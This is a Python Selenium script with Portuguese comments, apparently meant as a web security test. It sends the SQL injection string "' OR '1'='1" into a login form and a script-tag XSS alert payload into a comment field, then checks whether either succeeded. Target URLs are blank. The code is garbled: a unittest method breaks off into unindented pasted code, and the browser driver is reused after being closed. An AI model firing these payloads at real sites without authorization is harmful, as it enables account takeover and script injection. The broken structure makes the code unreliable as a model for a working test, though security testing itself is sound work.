import unittest
from selenium import webdriver

class TestSecurity(unittest.TestCase):
    
    def setUp(self):
        
        self.driver = webdriver.Chrome()
        self.driver.maximize_window()

    def test_security_vulnerabilities(self):
        # Teste de injeção de SQL
        self.driver.get(" ")
        from selenium import webdriver

# Configuração do WebDriver
driver = webdriver.Chrome()
driver.maximize_window()


url = " "

# Ataque de injeção de SQL
username = "' OR '1'='1"  
password = "' OR '1'='1"  

#  nome de usuário e senha com os valores manipulados
driver.get(url)
driver.find_element_by_id("username").send_keys(username)
driver.find_element_by_id("password").send_keys(password)

# Enviando o formulário de login
driver.find_element_by_id("login_button").click()

# Verificando se o login foi bem-sucedido 
if "Bem-vindo" in driver.page_source:
    print("Login bem-sucedido (injetando SQL)")
else:
    print("Login falhou (injetando SQL)")

# Fechar o navegador após o teste
driver.quit()

        
# URL da página vulnerável a XSS 
url = " "

# Código XSS 
xss_payload = "<script>alert('XSS executado!');</script>"

#  campo de entrada com o payload XSS
driver.get(url)
comment_input = driver.find_element_by_id("comment")
comment_input.send_keys(xss_payload)


driver.find_element_by_id("submit_button").click()

# tempo do alerta
driver.implicitly_wait(2)

# Manipulando o alerta
try:
    alert = driver.switch_to.alert
    alert.accept()
    print("XSS bem-sucedido!")
except:
    print("XSS não executado ou alerta não encontrado.")

# Fechando o navegador após o teste
driver.quit()